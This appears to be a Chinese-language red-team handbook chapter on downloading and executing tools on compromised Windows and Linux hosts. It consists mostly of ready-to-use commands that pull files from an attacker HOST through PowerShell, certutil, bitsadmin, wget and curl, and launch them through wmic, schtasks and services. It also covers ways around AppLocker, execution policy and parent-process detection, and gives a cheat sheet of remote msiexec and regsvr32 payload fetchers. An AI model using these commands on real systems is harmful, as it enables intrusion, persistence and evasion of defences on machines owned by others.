# 第2章 下载与执行

## 下载通道

```powershell
# PowerShell
powershell -c "Invoke-WebRequest -uri http://HOST:8000/tool.zip -OutFile C:\ProgramData\tool.zip"

# CertUtil（可能被安全软件拦截）
certutil.exe -urlcache -split -f http://HOST:8000/tool.zip C:\ProgramData\tool.zip

# bitsadmin
bitsadmin /rawreturn /transfer getfile http://HOST:8000/tool.zip C:\ProgramData\tool.zip

# Linux
wget http://HOST:8000/tool.zip -O /tmp/tool.zip
curl http://HOST:8000/tool.zip -o /tmp/tool.zip
```

- HTTP 服务目录放置 `index.html`，避免目录列表暴露。
- 长期服务建议使用 `screen` 等会话工具，不要依赖会生成 `nohup.out` 的方式。
- 使用 HTTPS 时优先配置可信证书；自签名证书仅在授权测试环境使用。

## 启动方式

- `wmic process call create`：父进程通常为 `wmiprvse.exe`。
- `schtasks`：任务计划启动，可指定 SYSTEM 或指定用户。
- `sc create/start`：服务启动，父进程通常为 `services.exe`。
- 白名单程序、计划任务、服务、WMI 等方式应根据目标策略选择。

```cmd
schtasks /create /sc once /sd 2034/01/01 /st 11:00 /tn task1 /tr "C:\ProgramData\tool.exe"
schtasks /run /tn task1
sc create svc1 binpath= "C:\ProgramData\tool.exe" start= auto
sc start svc1
```

## 绕过限制

- AppLocker：检查可写白名单目录，或使用策略允许的解释器。
- PowerShell：仅使用授权脚本，必要时通过 `-ExecutionPolicy Bypass` 运行。
- 父进程检测：可使用 `explorer.exe` 启动程序等方式改变进程链。
- DLL 劫持/白加黑：必须验证目标程序和 DLL 位数、导出函数及加载顺序。

## 命令速查

### 下载

```powershell
powershell -c "Invoke-WebRequest -Uri http://<HOST>:<PORT>/tool.zip -OutFile C:\ProgramData\tool.zip"
certutil.exe -urlcache -split -f http://<HOST>:<PORT>/tool.zip C:\ProgramData\tool.zip
bitsadmin /rawreturn /transfer getfile http://<HOST>:<PORT>/tool.zip C:\ProgramData\tool.zip
```

```bash
wget http://<HOST>:<PORT>/tool.zip -O /tmp/tool.zip
curl http://<HOST>:<PORT>/tool.zip -o /tmp/tool.zip
curl -vik --resolve <FAKE_DOMAIN>:443:<HOST> https://<FAKE_DOMAIN>/test
```

### 启动

```cmd
wmic process call create "C:\ProgramData\tool.exe"
schtasks /create /sc once /sd 2034/01/01 /st 11:00 /tn <TASK> /tr "C:\ProgramData\tool.exe"
schtasks /run /tn <TASK>
sc create <SERVICE> binpath= "C:\ProgramData\tool.exe" start= auto
sc start <SERVICE>
explorer C:\ProgramData\tool.exe
```

### 快捷命令

```text
msiexec /passive /i http://<HOST>/<FILE>.msi
regsvr32 /u /n /s /i:http://<HOST>/<FILE>.sct scrobj.dll
accesschk64.exe -uwdgs Users C:\Windows\* /accepteula
```
